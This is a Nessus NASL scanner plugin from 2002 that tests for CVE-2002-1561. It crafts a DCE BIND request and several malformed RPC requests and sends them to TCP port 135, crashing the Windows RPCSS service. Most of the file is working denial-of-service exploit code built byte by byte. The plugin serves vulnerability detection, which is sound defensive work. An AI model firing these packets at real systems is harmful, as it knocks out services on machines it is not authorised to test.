#
# Test "Spike 2.7" MS RPC Services null pointer reference DoS
#
# Copyright (c) 2002 Pavel Kankovsky, DCIT s.r.o. <kan@dcit.cz>
# Permission to copy, modify, and redistribute this script under
# the terms of the GNU General Public License is hereby granted.
#
# This script is based on an exploit published on BugTraq:
#   Code by lion, Welcomde to HUC Website Http://www.cnhonker.com
#   2002/10/22
#

if (description) {
  script_id(11159);
  script_cve_id("CVE-2002-1561");
  if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-t-0008");
  script_bugtraq_id(6005);
  script_version("$Revision: 1.5 $");
 
  name["english"] = "MS RPC Services null pointer reference DoS";
  script_name(english:name["english"]);
 
  desc["english"] = "
MS Windows RPC service (RPCSS) crashes trying to dereference a
null pointer when it receives a certain malformed request.
All MS RPC-based services (i.e. a large part of MS Windows 2000+)
running on the target machine are rendered inoperable.

Solution : Block access to TCP port 135.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Attempts to crash MS RPC service the Spike 2.7-way";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2002 Pavel Kankovsky");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes");
  script_require_ports(135);
  exit(0);
}

#
# The script code starts here.
#

#
# Prepare DCE BIND request
#

function dce_bind()
{
  # Service UUID:
  #   B9E79E60-3D52-11CE-AAA1-00006901293F
  # (this is one of the services bound to port 135)
  sv_uuid = raw_string(
      0x60, 0x9E, 0xE7, 0xB9, 0x52, 0x3D, 0xCE, 0x11,
      0xAA, 0xA1, 0x00, 0x00, 0x69, 0x01, 0x29, 0x3F);
  # The version is incorrect "for extra fun" (should be 0.2)
  sv_vers = raw_string(0x02, 0x00, 0x02, 0x00);

  # Transfer syntar UUID:
  #   8A885D04-1CEB-11C9-9FE8-08002B104860
  ts_uuid = raw_string(
      0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
      0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);
  ts_vers = raw_string(0x02, 0x00, 0x00, 0x00);
      
  # Request header
  req_hdr = raw_string(
      0x05, 0x00,              # version, minor version
      0x0b, 0x03,              # BINDPACKET, flags (1st+last frag)
      0x10, 0x00, 0x00, 0x00,  # data representation (LE, ASCII, IEEE fp)
      0x48, 0x00,              # fragment length (72)
      0x00, 0x00,              # auth length
      0x02, 0x00, 0x00, 0x00,  # call id
      0xd0, 0x16, 0xd0, 0x16,  # max xmit frag, max recv frag
      0x00, 0x00, 0x00, 0x00,  # assoc group
      0x01,                    # num ctx items
      0x00, 0x00, 0x00,        # (padding)
      0x00, 0x00,              # p_cont_id
      0x01,                    # n_transfer_syn
      0x00);                   # (padding)

  return (string(
      req_hdr, sv_uuid, sv_vers, ts_uuid, ts_vers));
}

#
# Prepare evil DCE request I
#

function attack_dce_req_1()
{
  # Request header
  req_hdr = raw_string(
      0x05, 0x00,              # version, minor version
      0x00, 0x01,              # REQUESTPACKET, flags (1st frag)
      0x10, 0x00, 0x00, 0x00,  # data representation (LE, ASCII, IEEE fp)
      0xd0, 0x16,              # fragment length (5840)
      0x00, 0x00,              # auth length
      0x8f, 0x00, 0x00, 0x00,  # call id
      0x20, 0x27, 0x01, 0x00,  # alloc hint
      0x00, 0x00,              # context id
      0x02, 0x00,              # opnum: 0
      0xf0, 0x00, 0x00, 0x00,  # ?
      0x00, 0x00, 0x00, 0x00,  # ?
      0x0f, 0x00, 0x00, 0x00); # ?

  req_dt1 = crap(data:raw_string(0x41), length:240);

  req_dt2 = raw_string(
      0x88, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x88, 0x13, 0x00, 0x00);

  req_dt3 = crap(data:raw_string(0x42), length:5000);

  req_dt4 = raw_string(
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00);

  req_dt5 = crap(data:raw_string(0x43), length:512);

  req_dt6 = raw_string(
      0xfe, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0xfe, 0xff, 0x00, 0x00, 0x3d, 0x3d, 0x3d, 0x3d,
      0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d,
      0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d);

  return (string(
      req_hdr, req_dt1, req_dt2, req_dt3, req_dt4, req_dt5, req_dt6));
}

#
# Prepare evil DCE request II
# the size does not match fragment length?!
#

function attack_dce_req_2(ah, stuff)
{
  # grrr...nasl barfs on (ah/xx) & 0xff
  ah0 = ah & 0xff;
  ah1 = ah / 256;       ah1 = ah1 & 0xff;
  ah2 = ah / 65536;     ah2 = ah2 & 0xff;
  ah3 = ah / 16777216;  ah3 = ah3 & 0xff;

  # Request header
  req_hdr = raw_string(
      0x05, 0x00,              # version, minor version
      0x00, 0x00,              # REQUESTPACKET, flags (none)
      0x10, 0x00, 0x00, 0x00,  # data representation (LE, ASCII, IEEE fp)
      0xd0, 0x16,              # fragment length (5840...hmmm)
      0x00, 0x00,              # auth length
      0x8f, 0x00, 0x00, 0x00,  # call id
      ah0,  ah1,  ah2,  ah3,   # alloc hint
      0x00, 0x00,              # context id
      0x02, 0x00);             # opnum: ?

  req_dt1 = crap(data:raw_string(stuff), length:5000);

  return (string(req_hdr, req_dt1));
}

#
# Prepare evil DCE request III
# this makes absolutely no sense, hmm...
# the attack appears to work without it...
#

function attack_dce_req_3()
{
  # Request header? eh...sort of
  req_hdr = raw_string(
      0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x01, 0x10, 0x00, 0x00);

  req_dt1 = crap(data:raw_string(0x48), length:5000);

  return (string(req_hdr, req_dt1));
}

#
# Carry out the attack.
#

function attack(port)
{
  # connect
  soc = open_sock_tcp(port);
  if (!soc) return (1);

  # send bind request and check whether we got some reply
  # this is used as a liveness test
  send(socket:soc, data:dce_bind());
  r = recv(socket:soc, length:16);
  if (strlen(r) < 16) return (1);

  # send the evil packets
  send(socket:soc, data:attack_dce_req_1());
  send(socket:soc, data:attack_dce_req_2(ah:0x011050, stuff:0x44));
  send(socket:soc, data:attack_dce_req_2(ah:0xf980,   stuff:0x45));
  send(socket:soc, data:attack_dce_req_2(ah:0xe2b0,   stuff:0x46));
  send(socket:soc, data:attack_dce_req_2(ah:0x1560,   stuff:0x47));
  send(socket:soc, data:attack_dce_req_3());

  # see you!
  close(soc);
  return (0);
}


#
# The main program.
#

port = 135;

if (!get_port_state(port)) {
  exit(0);
}

maxtries = 5;
countdown = maxtries;

while (countdown > 0) {
  success = attack(port:port);
  if (success) {
    if (countdown == maxtries) {
      # XXX it refuses to talk to us
      # XXX should we print a warning?
      exit(0);
    }
    security_hole(port);
    exit(0);
  }
  countdown = countdown - 1;
  sleep(1);
}
